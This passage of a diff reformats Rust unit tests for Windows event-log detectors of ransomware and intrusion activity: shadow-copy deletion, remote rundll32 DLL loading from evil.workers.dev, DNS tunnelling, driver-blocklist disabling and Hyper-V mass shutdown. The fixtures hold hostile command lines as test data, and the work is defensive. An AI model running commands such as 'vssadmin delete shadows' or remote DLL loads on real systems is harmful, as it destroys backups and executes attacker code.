+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("Image", "C:\\Program Files\\7-Zip\\7z.exe"),
+                ("CommandLine", "7z.exe a exfil.7z C:\\sensitive\\"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_compression_staging(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1560.001");
@@ -1070,7 +1259,12 @@ mod tests {
 
     #[test]
     fn dns_exfil_detected_on_high_entropy_subdomain() {
-        let ev = vec![make_event(22, "Microsoft-Windows-Sysmon/Operational", vec![("QueryName","aGVsbG93b3JsZHRlc3RkYXRh.evil-tunnel.com")], 1_000_000_000)];
+        let ev = vec![make_event(
+            22,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![("QueryName", "aGVsbG93b3JsZHRlc3RkYXRh.evil-tunnel.com")],
+            1_000_000_000,
+        )];
         let hits = detect_dns_cloud_exfil(&ev);
         assert!(!hits.is_empty());
         assert_eq!(hits[0].mitre_technique_id, "T1048.003");
@@ -1084,8 +1278,22 @@ mod tests {
     #[test]
     fn run_all_detectors_aggregates_multiple_detections() {
         let events = vec![
-            make_event(4769, "Security", vec![("TicketEncryptionType","0x17"),("ServiceName","MSSQLSvc/srv"),("TargetUserName","svc")], 1_000),
-            make_event(5001, "Microsoft-Windows-Windows Defender/Operational", vec![("Value","disabled")], 2_000),
+            make_event(
+                4769,
+                "Security",
+                vec![
+                    ("TicketEncryptionType", "0x17"),
+                    ("ServiceName", "MSSQLSvc/srv"),
+                    ("TargetUserName", "svc"),
+                ],
+                1_000,
+            ),
+            make_event(
+                5001,
+                "Microsoft-Windows-Windows Defender/Operational",
+                vec![("Value", "disabled")],
+                2_000,
+            ),
         ];
         assert!(run_all_detectors(&events).len() >= 2);
     }
@@ -1094,9 +1302,15 @@ mod tests {
 
     #[test]
     fn byovd_zemana_driver_install_detected() {
-        let ev = vec![make_event(7045, "System",
-            vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            7045,
+            "System",
+            vec![
+                ("ServiceName", "ZemanaAntiMalware"),
+                ("ImagePath", "C:\\Windows\\ZAM64.sys"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_byovd_driver_install(&ev);
         assert!(!hits.is_empty(), "Zemana driver install must be detected");
         assert_eq!(hits[0].mitre_technique_id, "T1068");
@@ -1104,20 +1318,31 @@ mod tests {
 
     #[test]
     fn byovd_unknown_service_not_detected() {
-        let ev = vec![make_event(7045, "System",
-            vec![("ServiceName","VGAuthService"),("ImagePath","C:\\VMTools\\vmtools.dll")],
-            1_000)];
+        let ev = vec![make_event(
+            7045,
+            "System",
+            vec![
+                ("ServiceName", "VGAuthService"),
+                ("ImagePath", "C:\\VMTools\\vmtools.dll"),
+            ],
+            1_000,
+        )];
         assert!(detect_byovd_driver_install(&ev).is_empty());
     }
 
     #[test]
-    fn byovd_empty_events() { assert!(detect_byovd_driver_install(&[]).is_empty()); }
+    fn byovd_empty_events() {
+        assert!(detect_byovd_driver_install(&[]).is_empty());
+    }
 
     #[test]
     fn vss_deletion_detected_on_eid_8193() {
-        let ev = vec![make_event(8193, "Application",
-            vec![("Message","VSS error deleting shadow copy")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            8193,
+            "Application",
+            vec![("Message", "VSS error deleting shadow copy")],
+            1_000_000_000,
+        )];
         let hits = detect_vss_deletion(&ev);
         assert!(!hits.is_empty(), "VSS EID 8193 must be detected");
         assert_eq!(hits[0].mitre_technique_id, "T1490");
@@ -1125,36 +1350,60 @@ mod tests {
 
     #[test]
     fn vss_deletion_detected_on_eid_524() {
-        let ev = vec![make_event(524, "Application",
-            vec![("Message","Volume Shadow Copy snapshot deleted")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            524,
+            "Application",
+            vec![("Message", "Volume Shadow Copy snapshot deleted")],
+            1_000_000_000,
+        )];
         let hits = detect_vss_deletion(&ev);
         assert!(!hits.is_empty(), "VSS EID 524 must be detected");
     }
 
     #[test]
-    fn vss_deletion_empty_events() { assert!(detect_vss_deletion(&[]).is_empty()); }
+    fn vss_deletion_empty_events() {
+        assert!(detect_vss_deletion(&[]).is_empty());
+    }
 
     #[test]
     fn hyperv_mass_state_change_detected_on_three_vms() {
         let ns = 1_000_000_000_i64;
         let ev = vec![
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Alpha")], 10 * ns),
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Beta")], 20 * ns),
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Gamma")], 30 * ns),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Alpha")],
+                10 * ns,
+            ),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Beta")],
+                20 * ns,
+            ),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Gamma")],
+                30 * ns,
+            ),
         ];
         let hits = detect_hyperv_mass_state_change(&ev);
-        assert!(!hits.is_empty(), "3+ unique VMs stopping must trigger detection");
+        assert!(
+            !hits.is_empty(),
+            "3+ unique VMs stopping must trigger detection"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1486");
     }
 
     #[test]
     fn hyperv_single_vm_not_detected() {
-        let ev = vec![make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-            vec![("VmName","VM-Alpha")], 1_000_000_000)];
+        let ev = vec![make_event(
+            13002,
+            "Microsoft-Windows-Hyper-V-VMMS/Admin",
+            vec![("VmName", "VM-Alpha")],
+            1_000_000_000,
+        )];
         assert!(detect_hyperv_mass_state_change(&ev).is_empty());
     }
 
@@ -1165,10 +1414,19 @@ mod tests {
 
     #[test]
     fn wmi_lateral_movement_detected_on_5858_remote() {
-        let ev = vec![make_event(5858, "Microsoft-Windows-WMI-Activity/Operational",
-            vec![("ClientMachine","\\\\VICTIM-PC"),("User","CORP\\attacker"),
-                 ("Operation","Provider::ExecQuery - root\\cimv2 : SELECT * FROM Win32_Process")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            5858,
+            "Microsoft-Windows-WMI-Activity/Operational",
+            vec![
+                ("ClientMachine", "\\\\VICTIM-PC"),
+                ("User", "CORP\\attacker"),
+                (
+                    "Operation",
+                    "Provider::ExecQuery - root\\cimv2 : SELECT * FROM Win32_Process",
+                ),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_wmi_lateral_movement(&ev);
         assert!(!hits.is_empty(), "Remote WMI failure must be detected");
         assert_eq!(hits[0].mitre_technique_id, "T1047");
@@ -1176,18 +1434,30 @@ mod tests {
 
     #[test]
     fn wmi_lateral_movement_detected_on_5857_remote() {
-        let ev = vec![make_event(5857, "Microsoft-Windows-WMI-Activity/Operational",
-            vec![("ClientMachine","\\\\VICTIM-PC"),("User","CORP\\attacker")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            5857,
+            "Microsoft-Windows-WMI-Activity/Operational",
+            vec![
+                ("ClientMachine", "\\\\VICTIM-PC"),
+                ("User", "CORP\\attacker"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_wmi_lateral_movement(&ev);
         assert!(!hits.is_empty(), "Remote WMI query must be detected");
     }
 
     #[test]
     fn wmi_lateral_movement_local_not_detected() {
-        let ev = vec![make_event(5858, "Microsoft-Windows-WMI-Activity/Operational",
-            vec![("ClientMachine","localhost"),("User","NT AUTHORITY\\SYSTEM")],
-            1_000)];
+        let ev = vec![make_event(
+            5858,
+            "Microsoft-Windows-WMI-Activity/Operational",
+            vec![
+                ("ClientMachine", "localhost"),
+                ("User", "NT AUTHORITY\\SYSTEM"),
+            ],
+            1_000,
+        )];
         assert!(detect_wmi_lateral_movement(&ev).is_empty());
     }
 
@@ -1198,9 +1468,15 @@ mod tests {
 
     #[test]
     fn qwcrypt_ps_stopvm_detected_in_script_block() {
-        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
-            vec![("ScriptBlockText","Stop-VM -Name 'VM-Alpha' -Force -TurnOff")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4104,
+            "Microsoft-Windows-PowerShell/Operational",
+            vec![(
+                "ScriptBlockText",
+                "Stop-VM -Name 'VM-Alpha' -Force -TurnOff",
+            )],
+            1_000_000_000,
+        )];
         let hits = detect_qwcrypt_ps_patterns(&ev);
         assert!(!hits.is_empty(), "Stop-VM in script block must be detected");
         assert_eq!(hits[0].mitre_technique_id, "T1059.001");
@@ -1208,33 +1484,55 @@ mod tests {
 
     #[test]
     fn qwcrypt_ps_vssadmin_detected_in_script_block() {
-        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
-            vec![("ScriptBlockText","vssadmin delete shadows /all /quiet")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4104,
+            "Microsoft-Windows-PowerShell/Operational",
+            vec![("ScriptBlockText", "vssadmin delete shadows /all /quiet")],
+            1_000_000_000,
+        )];
         let hits = detect_qwcrypt_ps_patterns(&ev);
         assert!(!hits.is_empty(), "vssadmin delete shadows must be detected");
     }
 
     #[test]
     fn qwcrypt_ps_benign_script_not_detected() {
-        let ev = vec![make_event(4104, "Microsoft-Windows-PowerShell/Operational",
-            vec![("ScriptBlockText","Get-Process | Where-Object { $_.CPU -gt 50 }")],
-            1_000)];
+        let ev = vec![make_event(
+            4104,
+            "Microsoft-Windows-PowerShell/Operational",
+            vec![(
+                "ScriptBlockText",
+                "Get-Process | Where-Object { $_.CPU -gt 50 }",
+            )],
+            1_000,
+        )];
         assert!(detect_qwcrypt_ps_patterns(&ev).is_empty());
     }
 
     #[test]
-    fn qwcrypt_ps_empty_events() { assert!(detect_qwcrypt_ps_patterns(&[]).is_empty()); }
+    fn qwcrypt_ps_empty_events() {
+        assert!(detect_qwcrypt_ps_patterns(&[]).is_empty());
+    }
 
     #[test]
     fn security_task_created_detected_on_4698() {
-        let ev = vec![make_event(4698, "Security",
-            vec![("TaskName","\\Maintenance\\UpdateChecker"),
-                 ("SubjectUserName","SYSTEM"),
-                 ("TaskContent","<Actions><Exec><Command>C:\\Temp\\evil.exe</Command></Exec></Actions>")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4698,
+            "Security",
+            vec![
+                ("TaskName", "\\Maintenance\\UpdateChecker"),
+                ("SubjectUserName", "SYSTEM"),
+                (
+                    "TaskContent",
+                    "<Actions><Exec><Command>C:\\Temp\\evil.exe</Command></Exec></Actions>",
+                ),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_security_task_created(&ev);
-        assert!(!hits.is_empty(), "Security EID 4698 task creation must be detected");
+        assert!(
+            !hits.is_empty(),
+            "Security EID 4698 task creation must be detected"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1053.005");
     }
 
@@ -1247,179 +1545,317 @@ mod tests {
     fn qwcrypt_cluster_detected_on_byovd_plus_hyperv() {
         let ns = 1_000_000_000_i64;
         let ev = vec![
-            make_event(7045, "System",
-                vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
-                10 * ns),
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Alpha")], 20 * ns),
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Beta")], 30 * ns),
-            make_event(13002, "Microsoft-Windows-Hyper-V-VMMS/Admin",
-                vec![("VmName","VM-Gamma")], 40 * ns),
+            make_event(
+                7045,
+                "System",
+                vec![
+                    ("ServiceName", "ZemanaAntiMalware"),
+                    ("ImagePath", "C:\\Windows\\ZAM64.sys"),
+                ],
+                10 * ns,
+            ),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Alpha")],
+                20 * ns,
+            ),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Beta")],
+                30 * ns,
+            ),
+            make_event(
+                13002,
+                "Microsoft-Windows-Hyper-V-VMMS/Admin",
+                vec![("VmName", "VM-Gamma")],
+                40 * ns,
+            ),
         ];
         let hits = detect_qwcrypt_cluster(&ev);
-        assert!(!hits.is_empty(), "BYOVD + Hyper-V mass shutdown must trigger QWCrypt cluster");
+        assert!(
+            !hits.is_empty(),
+            "BYOVD + Hyper-V mass shutdown must trigger QWCrypt cluster"
+        );
         assert_eq!(hits[0].confidence, Confidence::High);
     }
 
     #[test]
     fn qwcrypt_cluster_byovd_alone_not_sufficient() {
-        let ev = vec![make_event(7045, "System",
-            vec![("ServiceName","ZemanaAntiMalware"),("ImagePath","C:\\Windows\\ZAM64.sys")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            7045,
+            "System",
+            vec![
+                ("ServiceName", "ZemanaAntiMalware"),
+                ("ImagePath", "C:\\Windows\\ZAM64.sys"),
+            ],
+            1_000_000_000,
+        )];
         assert!(detect_qwcrypt_cluster(&ev).is_empty());
     }
 
     #[test]
-    fn qwcrypt_cluster_empty_events() { assert!(detect_qwcrypt_cluster(&[]).is_empty()); }
+    fn qwcrypt_cluster_empty_events() {
+        assert!(detect_qwcrypt_cluster(&[]).is_empty());
+    }
 
     // ── Gap-closure detection tests (RED) ────────────────────────────────────
 
     #[test]
     fn lnk_webdav_execution_detected_rundll32_unc() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
-                 ("CommandLine","rundll32.exe \\\\evil.workers.dev\\share\\srvcli.dll,DllMain")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![
+                ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
+                (
+                    "CommandLine",
+                    "rundll32.exe \\\\evil.workers.dev\\share\\srvcli.dll,DllMain",
+                ),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_lnk_webdav_execution(&ev);
-        assert!(!hits.is_empty(), "rundll32 with UNC WebDAV path must be detected");
+        assert!(
+            !hits.is_empty(),
+            "rundll32 with UNC WebDAV path must be detected"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1204.002");
     }
 
     #[test]
     fn lnk_webdav_execution_detected_rundll32_http() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
-                 ("CommandLine","rundll32.exe http://cdn.workers.dev/netutils.dll,EntryPoint")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![
+                ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
+                (
+                    "CommandLine",
+                    "rundll32.exe http://cdn.workers.dev/netutils.dll,EntryPoint",
+                ),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_lnk_webdav_execution(&ev);
         assert!(!hits.is_empty(), "rundll32 with http path must be detected");
     }
 
     #[test]
     fn lnk_webdav_execution_local_rundll32_not_detected() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe"),
-                 ("CommandLine","rundll32.exe C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL")],
-            1_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![
+                ("NewProcessName", "C:\\Windows\\System32\\rundll32.exe"),
+                (
+                    "CommandLine",
+                    "rundll32.exe C:\\Windows\\system32\\shell32.dll,OpenAs_RunDLL",
+                ),
+            ],
+            1_000,
+        )];
         assert!(detect_lnk_webdav_execution(&ev).is_empty());
     }
 
     #[test]
     fn lnk_webdav_execution_no_cmdline_not_detected() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Windows\\System32\\rundll32.exe")],
-            1_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![("NewProcessName", "C:\\Windows\\System32\\rundll32.exe")],
+            1_000,
+        )];
         assert!(detect_lnk_webdav_execution(&ev).is_empty());
     }
 
     #[test]
-    fn lnk_webdav_execution_empty() { assert!(detect_lnk_webdav_execution(&[]).is_empty()); }
+    fn lnk_webdav_execution_empty() {
+        assert!(detect_lnk_webdav_execution(&[]).is_empty());
+    }
 
     #[test]
     fn webdav_c2_detected_sysmon_rundll32_outbound() {
-        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
-            vec![("Image","C:\\Windows\\System32\\rundll32.exe"),
-                 ("DestinationIp","104.21.33.99"),
-                 ("DestinationPort","443"),
-                 ("DestinationHostname","evil.workers.dev")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            3,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("Image", "C:\\Windows\\System32\\rundll32.exe"),
+                ("DestinationIp", "104.21.33.99"),
+                ("DestinationPort", "443"),
+                ("DestinationHostname", "evil.workers.dev"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_webdav_c2(&ev);
-        assert!(!hits.is_empty(), "rundll32 Sysmon EID 3 outbound must be detected");
+        assert!(
+            !hits.is_empty(),
+            "rundll32 Sysmon EID 3 outbound must be detected"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1102");
     }
 
     #[test]
     fn webdav_c2_detected_msiexec_outbound() {
-        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
-            vec![("Image","C:\\Windows\\System32\\msiexec.exe"),
-                 ("DestinationIp","185.199.108.153"),
-                 ("DestinationPort","80")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            3,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("Image", "C:\\Windows\\System32\\msiexec.exe"),
+                ("DestinationIp", "185.199.108.153"),
+                ("DestinationPort", "80"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_webdav_c2(&ev);
-        assert!(!hits.is_empty(), "msiexec Sysmon EID 3 outbound must be detected");
+        assert!(
+            !hits.is_empty(),
+            "msiexec Sysmon EID 3 outbound must be detected"
+        );
     }
 
     #[test]
     fn webdav_c2_svchost_not_detected() {
-        let ev = vec![make_event(3, "Microsoft-Windows-Sysmon/Operational",
-            vec![("Image","C:\\Windows\\System32\\svchost.exe"),
-                 ("DestinationIp","8.8.8.8"),
-                 ("DestinationPort","443")],
-            1_000)];
+        let ev = vec![make_event(
+            3,
+            "Microsoft-Windows-Sysmon/Operational",
+            vec![
+                ("Image", "C:\\Windows\\System32\\svchost.exe"),
+                ("DestinationIp", "8.8.8.8"),
+                ("DestinationPort", "443"),
+            ],
+            1_000,
+        )];
         assert!(detect_webdav_c2(&ev).is_empty());
     }
 
     #[test]
-    fn webdav_c2_empty() { assert!(detect_webdav_c2(&[]).is_empty()); }
+    fn webdav_c2_empty() {
+        assert!(detect_webdav_c2(&[]).is_empty());
+    }
 
     #[test]
     fn hvci_registry_disable_detected_on_4657() {
-        let ev = vec![make_event(4657, "Security",
-            vec![("ObjectName","\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config"),
-                 ("ObjectValueName","VulnerableDriverBlocklistEnable"),
-                 ("NewValue","0"),
-                 ("SubjectUserName","SYSTEM")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4657,
+            "Security",
+            vec![
+                (
+                    "ObjectName",
+                    "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\CI\\Config",
+                ),
+                ("ObjectValueName", "VulnerableDriverBlocklistEnable"),
+                ("NewValue", "0"),
+                ("SubjectUserName", "SYSTEM"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_hvci_registry_disable(&ev);
-        assert!(!hits.is_empty(), "Driver Blocklist registry disable must be detected");
+        assert!(
+            !hits.is_empty(),
+            "Driver Blocklist registry disable must be detected"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1562.001");
     }
 
     #[test]
     fn hvci_registry_disable_detected_deviceguard() {
-        let ev = vec![make_event(4657, "Security",
-            vec![("ObjectName","\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard"),
-                 ("ObjectValueName","EnableVirtualizationBasedSecurity"),
-                 ("NewValue","0")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4657,
+            "Security",
+            vec![
+                (
+                    "ObjectName",
+                    "\\REGISTRY\\MACHINE\\SYSTEM\\CurrentControlSet\\Control\\DeviceGuard",
+                ),
+                ("ObjectValueName", "EnableVirtualizationBasedSecurity"),
+                ("NewValue", "0"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_hvci_registry_disable(&ev);
-        assert!(!hits.is_empty(), "HVCI DeviceGuard disable must be detected");
+        assert!(
+            !hits.is_empty(),
+            "HVCI DeviceGuard disable must be detected"
+        );
     }
 
     #[test]
     fn hvci_registry_disable_unrelated_key_not_detected() {
-        let ev = vec![make_event(4657, "Security",
-            vec![("ObjectName","\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run"),
-                 ("ObjectValueName","SomeApp"),
-                 ("NewValue","C:\\malware.exe")],
-            1_000)];
+        let ev = vec![make_event(
+            4657,
+            "Security",
+            vec![
+                (
+                    "ObjectName",
+                    "\\REGISTRY\\MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",
+                ),
+                ("ObjectValueName", "SomeApp"),
+                ("NewValue", "C:\\malware.exe"),
+            ],
+            1_000,
+        )];
         assert!(detect_hvci_registry_disable(&ev).is_empty());
     }
 
     #[test]
-    fn hvci_registry_disable_empty() { assert!(detect_hvci_registry_disable(&[]).is_empty()); }
+    fn hvci_registry_disable_empty() {
+        assert!(detect_hvci_registry_disable(&[]).is_empty());
+    }
 
     #[test]
     fn qwcrypt_ioc_filename_rbcw_detected() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Users\\Public\\rbcw.exe"),
-                 ("CommandLine","rbcw.exe --hv --excludeVM GatewayVM key123")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![
+                ("NewProcessName", "C:\\Users\\Public\\rbcw.exe"),
+                ("CommandLine", "rbcw.exe --hv --excludeVM GatewayVM key123"),
+            ],
+            1_000_000_000,
+        )];
         let hits = detect_qwcrypt_ioc_filename(&ev);
-        assert!(!hits.is_empty(), "rbcw.exe execution must be detected as IOC");
+        assert!(
+            !hits.is_empty(),
+            "rbcw.exe execution must be detected as IOC"
+        );
         assert_eq!(hits[0].mitre_technique_id, "T1486");
     }
 
     #[test]
     fn qwcrypt_ioc_filename_adnotification_detected() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Users\\Temp\\ADNotificationManager.exe")],
-            1_000_000_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![(
+                "NewProcessName",
+                "C:\\Users\\Temp\\ADNotificationManager.exe",
+            )],
+            1_000_000_000,
+        )];
         let hits = detect_qwcrypt_ioc_filename(&ev);
-        assert!(!hits.is_empty(), "ADNotificationManager.exe must be detected as IOC");
+        assert!(
+            !hits.is_empty(),
+            "ADNotificationManager.exe must be detected as IOC"
+        );
     }
 
     #[test]
     fn qwcrypt_ioc_filename_benign_not_detected() {
-        let ev = vec![make_event(4688, "Security",
-            vec![("NewProcessName","C:\\Windows\\System32\\notepad.exe")],
-            1_000)];
+        let ev = vec![make_event(
+            4688,
+            "Security",
+            vec![("NewProcessName", "C:\\Windows\\System32\\notepad.exe")],
+            1_000,
+        )];
         assert!(detect_qwcrypt_ioc_filename(&ev).is_empty());
     }
 
     #[test]
-    fn qwcrypt_ioc_filename_empty() { assert!(detect_qwcrypt_ioc_filename(&[]).is_empty()); }
+    fn qwcrypt_ioc_filename_empty() {
+        assert!(detect_qwcrypt_ioc_filename(&[]).is_empty());
+    }
 
     // ── winevt-analysis bridge integration tests ─────────────────────────────
     // These tests verify that run_all_detectors() surfaces detections from the
